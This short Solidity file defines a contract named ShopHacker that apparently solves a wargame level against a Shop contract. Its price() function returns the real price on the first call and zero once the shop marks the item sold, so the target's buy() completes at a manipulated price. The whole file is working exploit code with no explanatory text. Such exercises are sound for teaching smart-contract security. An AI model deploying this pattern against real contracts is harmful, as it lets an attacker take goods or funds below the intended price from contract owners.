// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {console} from "forge-std/Test.sol";
import {Shop} from "./Shop.sol";

contract ShopHacker {
  bool public isSold;
  Shop public shop;

  function hack(address _shopAddr) public {
    shop = Shop(_shopAddr);
    shop.buy();
  }

  function price() external view returns (uint256) {
    if (shop.isSold()) {
      return 0;
    } else {
      return shop.price();
    }
  }
}